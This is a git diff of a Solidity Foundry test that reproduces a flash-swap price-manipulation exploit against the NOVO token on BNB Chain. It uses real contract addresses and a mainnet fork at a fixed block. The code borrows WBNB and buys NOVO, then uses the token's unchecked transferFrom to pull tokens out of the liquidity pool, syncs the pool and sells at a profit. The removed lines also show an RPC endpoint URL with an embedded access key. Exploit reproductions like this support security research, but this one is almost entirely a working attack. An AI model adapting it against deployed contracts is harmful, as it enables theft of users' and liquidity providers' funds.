@@ -17,73 +17,119 @@ interface INOVOLP {
   function sync() external;
 }
 
-
 contract ContractTest is DSTest {
-    IPancakePair PancakePair = IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
-    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
-    INOVOLP novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    uint256 mainnetFork;
-    
-    function setUp() public {
-        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 18225002); //fork bsc at block number 18225002
-        cheats.selectFork(mainnetFork);
-    }
+  IPancakePair PancakePair =
+    IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
+  IPancakeRouter PancakeRouter =
+    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+  INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
+  INOVOLP novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
+  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
-    function testExploit() public {
-        wbnb.deposit{value: 10*1e18}();
-        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", wbnb.balanceOf(address(this)), 18);
+  function setUp() public {
+    cheats.createSelectFork("bsc", 18225002); //fork bsc at block number 18225002
+  }
 
-        // Brrow 17.2 WBNB
-        bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, 172*1e17);
-        PancakePair.swap(0,172*1e17,address(this),data);
-        
-        emit log_named_decimal_uint("[End] After repay, WBNB balance of attacker", wbnb.balanceOf(address(this)), 18);
-    }
-    
-    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) public{
-        // 攻擊者先買入 NOVO Token
-        // 透過 NOVO Token 的 transferFrom 未過濾 `from`
-        // `from` 指定為 NOVO/WBNB 的 LP pool, 即可操縱 PancakeSwap NOVO/WBMB 的價格
-        // 攻擊者再賣出 flashswap 借來的 NOVO Token 即可獲利
+  function testExploit() public {
+    wbnb.deposit{ value: 10 * 1e18 }();
+    emit log_named_decimal_uint(
+      "[Start] Attacker WBNB balance before exploit",
+      wbnb.balanceOf(address(this)),
+      18
+    );
 
-        address[] memory path = new address[](2);
+    // Brrow 17.2 WBNB
+    bytes memory data = abi.encode(
+      0xEeBc161437FA948AAb99383142564160c92D2974,
+      172 * 1e17
+    );
+    PancakePair.swap(0, 172 * 1e17, address(this), data);
 
-        emit log_named_decimal_uint("[*] Attacker flashswap Borrow WBMB", amount1, 18);
+    emit log_named_decimal_uint(
+      "[End] After repay, WBNB balance of attacker",
+      wbnb.balanceOf(address(this)),
+      18
+    );
+  }
 
-        // Use borrow WBNB to swap some NOVO token
-        emit log_string("[*] Attacker going swap some NOVO...");
-        wbnb.approve(address(PancakeRouter), type(uint256).max);
-        path[0] = address(wbnb);
-        path[1] = address(novo);
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(172*1e17, 1, path, address(this), block.timestamp); // get 4,749,070,146,640,911 NOVO Token
-        require(novo.balanceOf(address(this)) != 0, "Swap Failed");
+  function pancakeCall(
+    address sender,
+    uint256 amount0,
+    uint256 amount1,
+    bytes calldata data
+  ) public {
+    // 攻擊者先買入 NOVO Token
+    // 透過 NOVO Token 的 transferFrom 未過濾 `from`
+    // `from` 指定為 NOVO/WBNB 的 LP pool, 即可操縱 PancakeSwap NOVO/WBMB 的價格
+    // 攻擊者再賣出 flashswap 借來的 NOVO Token 即可獲利
 
-        // Sync NOVO token balance before exploit
-        emit log_named_decimal_uint("\t[INFO] Attacker NOVO balance", novo.balanceOf(address(this)), 9);
-        emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);
+    address[] memory path = new address[](2);
 
+    emit log_named_decimal_uint(
+      "[*] Attacker flashswap Borrow WBMB",
+      amount1,
+      18
+    );
 
-        // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price
-        emit log_string("[E] Attacker going manipulate NOVO/WBNB LP...");
-        novo.transferFrom(address(novoLP), address(novo), 113951614762384370);  // 113,951,614.76238437 NOVO Token
-        emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);
-        
-        // Sync NOVO/WBNB price
-        novoLP.sync();
-        
-        // Swap NOVO to WBNB, make attacker profit
-        emit log_string("[*] Attacker going swap some WBNB...");
-        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
-        path[0] = address(novo);
-        path[1] = address(wbnb);
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(novo.balanceOf(address(this)), 1, path, address(this), block.timestamp);
-        require(wbnb.balanceOf(address(this)) > 172*1e17, "Exploit Failed");
+    // Use borrow WBNB to swap some NOVO token
+    emit log_string("[*] Attacker going swap some NOVO...");
+    wbnb.approve(address(PancakeRouter), type(uint256).max);
+    path[0] = address(wbnb);
+    path[1] = address(novo);
+    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+      172 * 1e17,
+      1,
+      path,
+      address(this),
+      block.timestamp
+    ); // get 4,749,070,146,640,911 NOVO Token
+    require(novo.balanceOf(address(this)) != 0, "Swap Failed");
 
-        // Payback the flashswap, will be `BorrowAmount` + 0.25% fee
-        require(wbnb.transfer(address(PancakePair),amount1 +4472*10e13), "Payback Failed");
-    }
-     receive() external payable {}
-} 
+    // Sync NOVO token balance before exploit
+    emit log_named_decimal_uint(
+      "\t[INFO] Attacker NOVO balance",
+      novo.balanceOf(address(this)),
+      9
+    );
+    emit log_named_decimal_uint(
+      "\t[INFO] PancakeSwap NOVO/WBNB LP balance",
+      novo.balanceOf(address(novoLP)),
+      9
+    );
+
+    // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price
+    emit log_string("[E] Attacker going manipulate NOVO/WBNB LP...");
+    novo.transferFrom(address(novoLP), address(novo), 113951614762384370); // 113,951,614.76238437 NOVO Token
+    emit log_named_decimal_uint(
+      "\t[INFO] PancakeSwap NOVO/WBNB LP balance",
+      novo.balanceOf(address(novoLP)),
+      9
+    );
+
+    // Sync NOVO/WBNB price
+    novoLP.sync();
+
+    // Swap NOVO to WBNB, make attacker profit
+    emit log_string("[*] Attacker going swap some WBNB...");
+    novo.approve(address(PancakePair), novo.balanceOf(address(this)));
+    path[0] = address(novo);
+    path[1] = address(wbnb);
+    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+      novo.balanceOf(address(this)),
+      1,
+      path,
+      address(this),
+      block.timestamp
+    );
+    require(wbnb.balanceOf(address(this)) > 172 * 1e17, "Exploit Failed");
+
+    // Payback the flashswap, will be `BorrowAmount` + 0.25% fee
+    require(
+      wbnb.transfer(address(PancakePair), amount1 + 4472 * 10e13),
+      "Payback Failed"
+    );
+  }
+
+  receive() external payable {}
+}
